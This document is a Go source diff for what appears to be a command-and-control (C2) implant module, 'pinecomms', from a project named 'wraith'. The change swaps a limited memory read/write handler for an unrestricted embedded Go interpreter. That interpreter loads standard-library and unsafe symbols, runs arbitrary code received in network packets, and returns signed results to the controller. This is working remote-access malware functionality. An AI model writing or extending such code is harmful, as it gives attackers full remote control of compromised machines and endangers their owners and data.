@@ -6,17 +6,23 @@ import (
 	"crypto/ed25519"
 	"encoding/hex"
 	"fmt"
+	"go/constant"
+	"go/token"
 	"math/rand"
 	"net/http"
 	"os"
 	"os/user"
+	"reflect"
 	"runtime"
 	"sync"
 	"time"
 
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
-	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
+	"dev.l1qu1d.net/wraith-labs/wraith/libwraith"
+	"github.com/traefik/yaegi/interp"
+	"github.com/traefik/yaegi/stdlib"
+	"github.com/traefik/yaegi/stdlib/unsafe"
 )
 
 const (
@@ -76,50 +82,68 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 	}
 
 	//
-	// Evaluate the packet conditions.
-	//
-
-	// TODO
-	//packetData.Conditions
-
-	//
 	// Execute the packet payload.
 	//
 
-	// Read cells.
-	readCells := make(map[string]any, len(packetData.Payload.Read))
-	for _, cell := range packetData.Payload.Read {
-		readCells[cell] = w.SHMGet(cell)
+	i := interp.New(interp.Options{
+		Unrestricted: true,
+	})
+
+	// Generated with `yaegi extract libwraith`.
+	stdlib.Symbols["libwraith/libwraith"] = map[string]reflect.Value{
+		"SHMCONF_WATCHER_CHAN_SIZE":     reflect.ValueOf(constant.MakeFromLiteral("255", token.INT, 0)),
+		"SHMCONF_WATCHER_NOTIF_TIMEOUT": reflect.ValueOf(constant.MakeFromLiteral("1", token.INT, 0)),
+		"SHM_ERRS":                      reflect.ValueOf(constant.MakeFromLiteral("\"err\"", token.STRING, 0)),
+
+		"Config": reflect.ValueOf((*libwraith.Config)(nil)),
+		"Wraith": reflect.ValueOf((*libwraith.Wraith)(nil)),
 	}
 
-	// Write cells.
-	for cell, value := range packetData.Payload.Write {
-		w.SHMSet(cell, value)
+	i.Use(stdlib.Symbols)
+	i.Use(unsafe.Symbols)
+
+	var (
+		response     any
+		result       reflect.Value
+		communicator func(*libwraith.Wraith) any
+		ok           bool
+	)
+
+	_, err = i.Eval(packetData.Payload)
+	if err != nil {
+		response = fmt.Errorf("could not evaluate due to error: %e", err)
+		goto respond
 	}
 
-	// List cells.
-	var memList []string
-	if packetData.Payload.ListMem {
-		mem := w.SHMDump()
-		memList = make([]string, 0, len(mem))
-		for key := range mem {
-			memList = append(memList, key)
-		}
+	result, err = i.Eval("main.X")
+	if err != nil {
+		response = fmt.Errorf("could not find `main.X`: %e", err)
+		goto respond
 	}
+
+	if !result.IsValid() {
+		// The program didn't return anything for us to run, so assume everything
+		// is done and notify the user.
+		response = "program did not return anything"
+		goto respond
+	}
+
+	communicator, ok = result.Interface().(func(*libwraith.Wraith) any)
+	if !ok {
+		response = fmt.Errorf("returned function was of incorrect type (%T)", result.Interface())
+		goto respond
+	}
+
+	response = communicator(w)
 
 	//
 	// Respond to the packet.
 	//
 
+respond:
 	responseData := proto.PacketRes{
-		Payload: struct {
-			Read    map[string]any
-			MemList []string
-		}{
-			Read:    readCells,
-			MemList: memList,
-		},
-		TxId: packetData.TxId,
+		Payload: response,
+		TxId:    packetData.TxId,
 	}
 
 	responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
@@ -127,6 +151,7 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		// There is no point sending anything because the TxId is included
 		// in the responseData and without it, c2 won't know what the response
 		// is to.
+		w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response to %s failed: %e", packetData.TxId, err))
 		return
 	}
 
